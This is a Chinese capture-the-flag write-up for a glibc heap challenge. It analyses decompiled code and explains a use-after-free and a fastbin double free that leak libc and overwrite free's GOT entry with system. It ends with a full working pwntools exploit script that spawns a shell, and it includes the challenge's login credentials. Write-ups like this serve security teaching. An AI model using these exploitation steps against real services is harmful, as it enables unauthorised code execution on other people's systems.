
## SCP_Foundation_Secret
- 题目描述：
    
    > 忘记了
- 题目附件：
- 考察点：fastbin attack (`uaf` + `double free`)
- 难度：中等
- 分值：300

### 程序分析

`glibc heap`相关的菜单题，主函数如下：

```c
void main(void){
  long in_FS_OFFSET;
  undefined4 local_1c;
  void *local_18;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_1c = 0;
  memset(local_18,0,10);
  init_system();
  local_18 = (void *)Login();
  menu();
  do {
    printf("> Now please tell me what you want to do :");
    __isoc99_scanf(&DAT_00401dff,&local_1c);
    switch(local_1c) {
    default:
      // ...
      Log_out_SCP();
      break;
    case 1:
      View_status(local_18);
      break;
    case 2:
      Creat_SCP();
      break;
    case 3:
      Modify_SCP();
      break;
    case 4:
      Delete_SCP();
      break;
    case 5:
      View_SCP();
      break;
    case 6:
      Log_out_SCP();
    }
  } while( true );
}
```

创建SCP的时候会连续malloc三次，主要代码如下：

```c
void Creat_SCP(void){
  // ...
  pvVar1 = malloc(0x10);
  *(void **)(SCP_Project_list + (long)local_24 * 8) = pvVar1;
  printf("> SCP name\'s length : ");
  __isoc99_scanf(&DAT_00401dff,&length);
  // ...
  p_name = malloc((long)(int)length);
  printf("> SCP name : ");
  read(0,p_name,(ulong)length);
  printf("> SCP description\'s length : ");
  __isoc99_scanf(&DAT_00401dff,&d_len);
  // ...
  printf("> SCP description : ");
  p_desc = malloc((long)(int)d_len);
  read(0,p_desc,(ulong)d_len);
  **(void ***)(SCP_Project_list + (long)local_24 * 8) = p_name;
  *(void **)(*(long *)(SCP_Project_list + (long)local_24 * 8) + 8) = p_desc;
  // ...
}
```

删除SCP的时候连续free三次，但是并未清空数据，主要部分如下：

```c
void Delete_SCP(void){
  // ...
  printf("> SCP project ID : ");
  __isoc99_scanf(&DAT_00401dff,&local_14);
  // ...
  free(**(void ***)(SCP_Project_list + (long)local_14 * 8));
  free(*(void **)(*(long *)(SCP_Project_list + (long)local_14 * 8) + 8));
  free(*(void **)(SCP_Project_list + (long)local_14 * 8));
  // ...
}
```

从上面俩函数中，可以分析出SCP的结构体如下：

```c
struct SCP{
    char *name;
    char *description;
}
```

查看SCP会打印`name`和`description`中的数据，主要部分如下：

```c
void View_SCP(void){
  // ...
  printf("> SCP project ID : ");
  __isoc99_scanf(&DAT_00401dff,&local_14);
  // ...
  printf("# SCP\'s name is %s\n",**(undefined8 **)(SCP_Project_list + (long)local_14 * 8));
  printf("# SCP\'s description is %s\n",
         *(undefined8 *)(*(long *)(SCP_Project_list + (long)local_14 * 8) + 8));
  // ...
}
```

### 解题思路
总体思路就是先利用`uaf`泄漏libc，然后`double free`，改`free`的`got`表为`system`函数，最后通过`free('/bin/sh')`拿到shell

创建SCP时，三次malloc依次为

1. SCP结构体，大小`0x20`
2. `name`，大小自定
3. `description`，大小自定

### UAF

利用fastbin LIFO的特性，先创建两个SCP，再删除它们，获得两个`0x20`的fastbin

> 这两个SCP的`name`和`description`的大小需要都不在`0x20`范围内

然后再创建一个SCP，`name`的大小等于`0x18`，这时`name`的`chunk`就会被分派到已经释放了的0号节点的位置，向`name`中写入任意地址，只要查看0号节点，就可以打印出该地址中的数据

我的做法是向`name`中写`free`的`got`表，然后打印出`libc`中`free`的地址：

```python
add(0x28,'AAAAAAAA',0x58,'aaaaaaaa') #0
add(0x28,'BBBBBBBB',0x58,'bbbbbbbb') #1
# leak libc
dlt(0)
dlt(1)
add(0x18,p64(elf.got['free']),0x18,'dddddddd') #3
free = uu64(show(0))
```

### Double Free

题目有限制，只能添加10个SCP，因此要节约使用，刚刚泄漏libc时创建的两个节点可以重复使用，uaf只是在`0x20`的`fastbin`上做手脚，其余的`fastbin`不受影响。

虽然创建一次会连续`malloc`三次，但是只要这三次`malloc`出的`chunk`大小不一样，就不会互相影响。

这里有一点需要注意，要想成功`malloc`到`free`的`GOT`表，必须要先伪造`chunk`的`size`，通过调试，顺着`GOT`表中`free`的地址往前找，在第`14`字节找到了`0x60`，因此往这里可以分配`0x50-0x60`的chunk

```c
pwndbg> got
[0x603018] free@GLIBC_2.2.5 -> 0x7ff53a3dd4f0 (free) ◂— push   r13

pwndbg> x/8xg 0x603018-0x10-14
0x602ffa:	0x2e28000000000000	0xa168000000000060 ◂— size
0x60300a:	0xae1000007ff53a94	0xd4f000007ff53a73
0x60301a:	0x869000007ff53a3d	0x078600007ff53a3c
0x60302a:	0xf6b0000000000040	0xe80000007ff53a3c
```

具体的操作如下：

```python
add(0x28,'AAAAAAAA',0x58,'aaaaaaaa') #0
add(0x28,'BBBBBBBB',0x58,'bbbbbbbb') #1
add(0x28,'CCCCCCCC',0x58,'cccccccc') #2

# leak libc
dlt(0)
dlt(1)
add(0x18,p64(elf.got['free']),0x18,'dddddddd') #3
free = uu64(show(0))
dlt(3)

# double free
dlt(0)
add(0x28,p64(0xdeadbeef),0x58,p64(elf.got['free']-16-14)) #4
add(0x28,p64(0xdeadbeef),0x58,'eeeeeeee') #5
add(0x28,p64(0xdeadbeef),0x58,'ffffffff') #6

# overwrite free got
add(0x28,'/bin/sh\0',0x58,'a'*14+p64(system)) #7
```

### getshell

```python
# system('/bin/sh')
dlt(7)
```

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './SCP_Foundation'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../../libc-2.23.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def add(n_size, name, d_size, desc):
    sla('want to do :','2')
    sla('> SCP name\'s length : ', str(n_size))
    sea('> SCP name : ',name)
    sleep(0.1)
    sla('length : ',str(d_size))
    sea('SCP description : ',desc)
    sleep(0.1)

def dlt(index):
    sla('want to do :','4')
    sla('> SCP project ID : ',str(index))

def show(index):
    sla('want to do :','5')
    sleep(0.1)
    sla('> SCP project ID : ',str(index))
    ru('# SCP\'s name is ')
    return rc(6)

def login():
    sla('> Username:','TaQi')
    sla('> Password:','For_the_glory_of_Brunhild')

login()

add(0x28,'AAAAAAAA',0x58,'aaaaaaaa') #0
add(0x28,'BBBBBBBB',0x58,'bbbbbbbb') #1
add(0x28,'CCCCCCCC',0x58,'cccccccc') #2

# leak libc
dlt(0)
dlt(1)
add(0x18,p64(elf.got['free']),0x18,'dddddddd') #3
free = uu64(show(0))
libc_base = free - libc.sym['free']
info_addr('libc_base',libc_base)
system = libc_base + libc.sym['system']
dlt(3)

# double free
dlt(0)
add(0x28,p64(0xdeadbeef),0x58,p64(elf.got['free']-16-14)) #4
add(0x28,p64(0xdeadbeef),0x58,'eeeeeeee') #5
add(0x28,p64(0xdeadbeef),0x58,'ffffffff') #6

# overwrite free got
# debug()
add(0x28,'/bin/sh\0',0x58,'a'*14+p64(system)) #7

# system('/bin/sh')
dlt(7)

p.interactive()
```

